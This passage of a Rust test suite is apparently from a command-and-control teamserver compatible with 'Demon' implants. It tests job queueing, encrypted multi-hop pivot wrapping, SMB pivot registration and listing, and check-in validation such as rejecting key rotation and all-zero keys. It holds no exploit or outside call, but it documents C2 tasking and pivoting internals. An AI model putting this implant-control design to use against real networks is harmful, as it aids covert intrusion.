            .dispatch(agent_id, u32::from(DemonCommand::CommandGetJob), 9, &[])
            .await?
            .ok_or_else(|| "get job should return serialized packages".to_owned())?;
        let message = red_cell_common::demon::DemonMessage::from_bytes(&response)?;

        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[0].payload)?, vec![1, 2, 3, 4]);
        assert!(registry.queued_jobs(agent_id).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_get_job_wraps_linked_child_jobs_through_pivot_chain()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let root_id = 0x0102_0304;
        let pivot_id = 0x1112_1314;
        let child_id = 0x2122_2324;
        let root_key = [0x10; AGENT_KEY_LENGTH];
        let root_iv = [0x20; AGENT_IV_LENGTH];
        let pivot_key = [0x30; AGENT_KEY_LENGTH];
        let pivot_iv = [0x40; AGENT_IV_LENGTH];
        let child_key = [0x50; AGENT_KEY_LENGTH];
        let child_iv = [0x60; AGENT_IV_LENGTH];

        registry.insert(sample_agent_info(root_id, root_key, root_iv)).await?;
        registry.insert(sample_agent_info(pivot_id, pivot_key, pivot_iv)).await?;
        registry.insert(sample_agent_info(child_id, child_key, child_iv)).await?;
        registry.add_link(root_id, pivot_id).await?;
        registry.add_link(pivot_id, child_id).await?;
        registry
            .enqueue_job(
                child_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 77,
                    payload: vec![9, 8, 7, 6],
                    command_line: "sleep 5".to_owned(),
                    task_id: "task-77".to_owned(),
                    created_at: "2026-03-09T20:12:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;

        let response = dispatcher
            .dispatch(root_id, u32::from(DemonCommand::CommandGetJob), 9, &[])
            .await?
            .ok_or_else(|| "get job should return serialized packages".to_owned())?;
        let message = DemonMessage::from_bytes(&response)?;
        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandPivot));

        let first_layer = decrypt_agent_data(&root_key, &root_iv, &message.packages[0].payload)?;
        let (first_target, first_inner) = decode_pivot_payload(&first_layer)?;
        assert_eq!(first_target, pivot_id);

        let second_layer = DemonMessage::from_bytes(&first_inner)?;
        assert_eq!(second_layer.packages.len(), 1);
        let second_payload =
            decrypt_agent_data(&pivot_key, &pivot_iv, &second_layer.packages[0].payload)?;
        let (second_target, second_inner) = decode_pivot_payload(&second_payload)?;
        assert_eq!(second_target, child_id);

        let child_message = DemonMessage::from_bytes(&second_inner)?;
        assert_eq!(child_message.packages.len(), 1);
        assert_eq!(child_message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(child_message.packages[0].request_id, 77);
        assert_eq!(
            decrypt_agent_data(&child_key, &child_iv, &child_message.packages[0].payload)?,
            vec![9, 8, 7, 6]
        );
        Ok(())
    }

    #[tokio::test]
    async fn pivot_connect_callback_registers_child_and_link()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let parent_id = 0x4546_4748;
        let parent_key = [0x21; AGENT_KEY_LENGTH];
        let parent_iv = [0x31; AGENT_IV_LENGTH];
        let child_id = 0x5152_5354;
        let child_key = [0x41; AGENT_KEY_LENGTH];
        let child_iv = [0x51; AGENT_IV_LENGTH];

        registry
            .insert_with_listener(sample_agent_info(parent_id, parent_key, parent_iv), "http-main")
            .await?;

        let response = dispatcher
            .dispatch(
                parent_id,
                u32::from(DemonCommand::CommandPivot),
                17,
                &pivot_connect_payload(&valid_demon_init_body(child_id, child_key, child_iv)),
            )
            .await?;

        assert_eq!(response, None);
        assert_eq!(registry.parent_of(child_id).await, Some(parent_id));
        assert_eq!(registry.children_of(parent_id).await, vec![child_id]);
        assert!(registry.get(child_id).await.is_some());
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentNew event after pivot connect".to_owned())?;
        let red_cell_common::operator::OperatorMessage::AgentNew(message) = event else {
            return Err("expected AgentNew event after pivot connect".into());
        };
        assert_eq!(message.info.name_id, "51525354");
        assert_eq!(message.info.listener, "http-main");
        assert_eq!(message.info.pivots.parent.as_deref(), Some("45464748"));
        assert_eq!(message.info.pivots.links, Vec::<String>::new());
        assert_eq!(message.info.pivot_parent, "45464748");
        Ok(())
    }

    #[tokio::test]
    async fn pivot_connect_callback_child_snapshot_preserves_listener_provenance()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let parent_id = 0xAABB_CCDD;
        let parent_key = [0x11; AGENT_KEY_LENGTH];
        let parent_iv = [0x22; AGENT_IV_LENGTH];
        let child_id = 0x1122_3344;
        let child_key = [0x33; AGENT_KEY_LENGTH];
        let child_iv = [0x44; AGENT_IV_LENGTH];

        registry
            .insert_with_listener(
                sample_agent_info(parent_id, parent_key, parent_iv),
                "http-external",
            )
            .await?;

        dispatcher
            .dispatch(
                parent_id,
                u32::from(DemonCommand::CommandPivot),
                42,
                &pivot_connect_payload(&valid_demon_init_body(child_id, child_key, child_iv)),
            )
            .await?;

        // The child's persisted listener_name must match the parent's — not "null".
        assert_eq!(
            registry.listener_name(child_id).await.as_deref(),
            Some("http-external"),
            "child pivot listener_name must inherit the parent's listener, not be 'null'"
        );
        Ok(())
    }

    fn pivot_list_payload(entries: &[(u32, &str)]) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::List).to_le_bytes());
        for (demon_id, pipe_name) in entries {
            payload.extend_from_slice(&demon_id.to_le_bytes());
            let utf16: Vec<u16> = pipe_name.encode_utf16().collect();
            let utf16_bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
            let len = u32::try_from(utf16_bytes.len()).unwrap_or_default();
            payload.extend_from_slice(&len.to_le_bytes());
            payload.extend_from_slice(&utf16_bytes);
        }
        payload
    }

    #[tokio::test]
    async fn pivot_list_callback_demon_id_is_zero_padded_on_left()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let agent_id = 0xAAAA_BBBB;
        let key = [0x11; AGENT_KEY_LENGTH];
        let iv = [0x22; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        // demon_id = 0x1 is only 1 hex digit — must be padded to "00000001", not "10000000"
        let response = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandPivot),
                100,
                &pivot_list_payload(&[(0x1, "\\\\.\\pipe\\test")]),
            )
            .await?;

        assert_eq!(response, None);
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentResponse event after pivot list".to_owned())?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err("expected AgentResponse".into());
        };
        let output = &msg.info.output;
        assert!(
            output.contains("00000001"),
            "demon id 0x1 must be right-aligned zero-padded to '00000001', got: {output}"
        );
        assert!(
            !output.contains("10000000"),
            "demon id 0x1 must NOT be left-aligned to '10000000', got: {output}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn pivot_list_callback_with_entries_broadcasts_formatted_table()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let agent_id = 0xAAAA_BBBB;
        let key = [0x11; AGENT_KEY_LENGTH];
        let iv = [0x22; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        let response = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandPivot),
                99,
                &pivot_list_payload(&[
                    (0x1234_5678, "\\\\.\\pipe\\foo"),
                    (0xDEAD_BEEF, "\\\\.\\pipe\\bar"),
                ]),
            )
            .await?;

        assert_eq!(response, None);
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentResponse event after pivot list".to_owned())?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err("expected AgentResponse".into());
        };
        assert_eq!(msg.info.demon_id, format!("{agent_id:08X}"));
        assert_eq!(msg.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        let message = msg.info.extra.get("Message").and_then(Value::as_str).unwrap_or("");
        assert!(message.contains("Pivot List [2]"), "message: {message}");
        let output = &msg.info.output;
        assert!(output.contains("12345678"), "output: {output}");
        assert!(output.contains("pipe\\foo"), "output: {output}");
        assert!(output.contains("deadbeef"), "output: {output}");
        assert!(output.contains("pipe\\bar"), "output: {output}");
        Ok(())
    }

    #[tokio::test]
    async fn pivot_list_callback_empty_broadcasts_no_pivots_message()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let agent_id = 0xCCCC_DDDD;
        let key = [0x33; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandPivot), 77, &pivot_list_payload(&[]))
            .await?;

        assert_eq!(response, None);
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentResponse event after empty pivot list".to_owned())?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err("expected AgentResponse".into());
        };
        assert_eq!(msg.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            msg.info.extra.get("Message"),
            Some(&Value::String("No pivots connected".to_owned()))
        );
        assert!(
            msg.info.output.is_empty(),
            "output should be empty for no pivots: {}",
            msg.info.output
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_updates_last_call_in_and_broadcasts()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let before = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist before checkin".to_owned())?
            .last_call_in;

        let response =
            dispatcher.dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &[]).await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist after checkin".to_owned())?;
        assert_ne!(updated.last_call_in, before);

        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "agent update event should be broadcast".to_owned())?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.agent_id, format!("{agent_id:08X}"));
        assert_eq!(message.info.marked, "Alive");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_truncated_metadata_payload()
    -> Result<(), Box<dyn std::error::Error>> {
        // Any non-empty payload shorter than the 48-byte metadata prefix must be rejected
        // as a protocol error — not silently accepted as a heartbeat.
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        // Test a range of truncated payload lengths: 1 byte, the boundary-minus-one (47 bytes),
        // and a mid-range value.
        for truncated_len in [1_usize, 16, 47] {
            let truncated_payload = vec![0xAA; truncated_len];
            let err = dispatcher
                .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &truncated_payload)
                .await
                .expect_err("truncated CHECKIN payload must be rejected");
            assert!(
                matches!(
                    err,
                    CommandDispatchError::InvalidCallbackPayload { command_id, .. }
                    if command_id == u32::from(DemonCommand::CommandCheckin)
                ),
                "expected InvalidCallbackPayload for {truncated_len}-byte payload, got {err:?}"
            );
        }
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_truncated_payload_does_not_mutate_state()
    -> Result<(), Box<dyn std::error::Error>> {
        // A truncated CHECKIN must not update last_call_in or broadcast any event.
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let before = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist before checkin".to_owned())?
            .last_call_in;

        let truncated_payload = vec![0xAA; 10];
        let _ = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &truncated_payload)
            .await
            .expect_err("truncated CHECKIN payload must be rejected");

        let after = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should still exist after rejected checkin".to_owned())?
            .last_call_in;

        assert_eq!(before, after, "last_call_in must not change on rejected truncated CHECKIN");
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected truncated CHECKIN must not broadcast an agent update event"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_refreshes_metadata_and_transport_state()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let refreshed_key = [0x12; AGENT_KEY_LENGTH];
        let refreshed_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry.set_ctr_offset(agent_id, 7).await?;
        let payload = sample_checkin_metadata_payload(agent_id, refreshed_key, refreshed_iv);

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &payload)
            .await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist after metadata-bearing checkin".to_owned())?;
        assert_eq!(updated.hostname, "wkstn-02");
        assert_eq!(updated.username, "svc-op");
        assert_eq!(updated.domain_name, "research");
        assert_eq!(updated.internal_ip, "10.10.10.50");
        assert_eq!(updated.process_name, "cmd.exe");
        assert_eq!(updated.process_path, "C:\\Windows\\System32\\cmd.exe");
        assert_eq!(updated.process_pid, 4040);
        assert_eq!(updated.process_tid, 5050);
        assert_eq!(updated.process_ppid, 3030);
        assert_eq!(updated.process_arch, "x86");
        assert!(!updated.elevated);
        assert_eq!(updated.base_address, 0x401000);
        assert_eq!(updated.os_version, "Windows 11");
        assert_eq!(updated.os_arch, "x64/AMD64");
        assert_eq!(updated.sleep_delay, 45);
        assert_eq!(updated.sleep_jitter, 5);
        assert_eq!(updated.kill_date, Some(1_725_000_000));
        assert_eq!(updated.working_hours, Some(0x00FF_00FF));
        // Key rotation from CHECKIN is rejected — original key material must be preserved.
        assert_eq!(updated.encryption.aes_key.as_slice(), key.as_slice());
        assert_eq!(updated.encryption.aes_iv.as_slice(), iv.as_slice());
        // CTR offset must not be reset when rotation is refused.
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should be persisted after checkin".to_owned())?;
        assert_eq!(persisted, updated);

        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "agent update event should be broadcast".to_owned())?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.agent_id, format!("{agent_id:08X}"));
        assert_eq!(message.info.marked, "Alive");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_key_rotation_and_preserves_ctr_offset()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let original_key = [0x77; AGENT_KEY_LENGTH];
        let original_iv = [0x44; AGENT_IV_LENGTH];
        let attempted_key = [0x12; AGENT_KEY_LENGTH];
        let attempted_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_304A;
        let pre_checkin_plaintext = b"advance shared ctr state";
        let post_checkin_plaintext = b"sleep 45 5";

        registry.insert(sample_agent_info(agent_id, original_key, original_iv)).await?;

        // Advance the CTR offset to a non-zero value before the CHECKIN.
        let pre_checkin_ciphertext =
            encrypt_agent_data_at_offset(&original_key, &original_iv, 0, pre_checkin_plaintext)?;
        assert_eq!(
            registry.decrypt_from_agent(agent_id, &pre_checkin_ciphertext).await?,
            pre_checkin_plaintext
        );
        let advanced_offset = registry.ctr_offset(agent_id).await?;
        assert_eq!(advanced_offset, ctr_blocks_for_len(pre_checkin_ciphertext.len()));
        assert!(advanced_offset > 0);

        // Dispatch a CHECKIN that attempts to rotate to a different key.
        let payload = sample_checkin_metadata_payload(agent_id, attempted_key, attempted_iv);
        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &payload)
            .await?;
        assert_eq!(response, None);

        // The rotation must be refused: CTR offset preserved, original key still active.
        assert_eq!(registry.ctr_offset(agent_id).await?, advanced_offset);
        assert_eq!(
            registry.get(agent_id).await.unwrap().encryption.aes_key.as_slice(),
            original_key.as_slice()
        );
        assert_eq!(
            registry.get(agent_id).await.unwrap().encryption.aes_iv.as_slice(),
            original_iv.as_slice()
        );

        // Subsequent encryption must still use the original key at the preserved offset.
        let post_checkin_ciphertext =
            registry.encrypt_for_agent(agent_id, post_checkin_plaintext).await?;
        assert_eq!(
            post_checkin_ciphertext,
            encrypt_agent_data_at_offset(
                &original_key,
                &original_iv,
                advanced_offset,
                post_checkin_plaintext,
            )?
        );
        // Must NOT encrypt with the attempted rotated key.
        assert_ne!(
            post_checkin_ciphertext,
            encrypt_agent_data_at_offset(&attempted_key, &attempted_iv, 0, post_checkin_plaintext)?
        );

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_kill_date_exceeding_i64_range()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let refreshed_key = [0x12; AGENT_KEY_LENGTH];
        let refreshed_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3041;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry.set_ctr_offset(agent_id, 7).await?;
        let payload = sample_checkin_metadata_payload_with_kill_date_and_working_hours(
            agent_id,
            refreshed_key,
            refreshed_iv,
            i64::MAX as u64 + 1,
            0x00FF_00FF,
        );

        let error = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &payload)
            .await
            .expect_err("overflowing kill date checkin must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandCheckin)
                    && message == "checkin kill date exceeds i64 range"
        ));
        assert_eq!(
            registry
                .get(agent_id)
                .await
                .ok_or_else(|| "agent should remain registered".to_owned())?
                .kill_date,
            None
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected checkin should not broadcast updates"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_all_zero_rotated_aes_key_without_mutating_state()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let original_key = [0x77; AGENT_KEY_LENGTH];
        let original_iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3043;

        let original = sample_agent_info(agent_id, original_key, original_iv);
        registry.insert(original.clone()).await?;
        registry.set_ctr_offset(agent_id, 7).await?;

        let error = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandCheckin),
                6,
                &sample_checkin_metadata_payload(
                    agent_id,
                    [0; AGENT_KEY_LENGTH],
                    [0x34; AGENT_IV_LENGTH],
                ),
            )
            .await
            .expect_err("all-zero key rotation must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandCheckin)
                    && message == "all-zero AES key is not allowed"
        ));

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should remain registered after rejected checkin".to_owned())?;
        assert_eq!(updated, original);
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should remain persisted after rejected checkin".to_owned())?;
        assert_eq!(persisted, original);

        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected checkin should not broadcast updates"
        );

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_all_zero_rotated_aes_iv_without_mutating_state()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let original_key = [0x77; AGENT_KEY_LENGTH];
        let original_iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3044;

        let original = sample_agent_info(agent_id, original_key, original_iv);
        registry.insert(original.clone()).await?;
        registry.set_ctr_offset(agent_id, 7).await?;

        let error = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandCheckin),
                6,
                &sample_checkin_metadata_payload(
                    agent_id,
                    [0x55; AGENT_KEY_LENGTH],
                    [0; AGENT_IV_LENGTH],
                ),
            )
            .await
            .expect_err("all-zero IV rotation must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandCheckin)
                    && message == "all-zero AES IV is not allowed"
        ));

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should remain registered after rejected checkin".to_owned())?;
        assert_eq!(updated, original);
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should remain persisted after rejected checkin".to_owned())?;
        assert_eq!(persisted, original);

        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected checkin should not broadcast updates"
        );

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_returns_agent_not_found_for_unknown_agent()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);
        let agent_id = 0x1020_3042;

        let error = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &[0xAA, 0xBB])
            .await
            .expect_err("unknown agent checkin should fail");

        assert!(matches!(
            error,
            CommandDispatchError::Registry(TeamserverError::AgentNotFound { agent_id: missing_id })
                if missing_id == agent_id
        ));
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "unknown agent checkin should not broadcast an event"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_preserves_high_bit_working_hours()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let refreshed_key = [0x12; AGENT_KEY_LENGTH];
        let refreshed_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3041;
        let working_hours = 0x8000_002A;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let payload = sample_checkin_metadata_payload_with_working_hours(
            agent_id,
            refreshed_key,
            refreshed_iv,
            working_hours,
        );

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 7, &payload)
            .await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist after metadata-bearing checkin".to_owned())?;
        assert_eq!(updated.working_hours, Some(i32::from_be_bytes(working_hours.to_be_bytes())));

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should be persisted after checkin".to_owned())?;
        assert_eq!(persisted.working_hours, updated.working_hours);

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_refuses_transport_rotation_for_pivoted_agents()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let parent_id = 0x4546_4748;
        let parent_key = [0x21; AGENT_KEY_LENGTH];
        let parent_iv = [0x31; AGENT_IV_LENGTH];
        let agent_id = 0x5152_5354;
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let rotated_key = [0x12; AGENT_KEY_LENGTH];
        let rotated_iv = [0x34; AGENT_IV_LENGTH];

        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;
        registry.insert_with_listener(sample_agent_info(agent_id, key, iv), "smb").await?;
        registry.add_link(parent_id, agent_id).await?;
        registry.set_ctr_offset(agent_id, 7).await?;

        let response = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandCheckin),
                7,
                &sample_checkin_metadata_payload(agent_id, rotated_key, rotated_iv),
            )
            .await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "pivoted agent should exist after checkin".to_owned())?;
        assert_eq!(updated.hostname, "wkstn-02");
        assert_eq!(updated.encryption.aes_key.as_slice(), key.as_slice());
        assert_eq!(updated.encryption.aes_iv.as_slice(), iv.as_slice());
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "pivoted agent should remain persisted after checkin".to_owned())?;
        assert_eq!(persisted.encryption.aes_key.as_slice(), key.as_slice());
        assert_eq!(persisted.encryption.aes_iv.as_slice(), iv.as_slice());

        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_list_handler_broadcasts_formatted_agent_response()
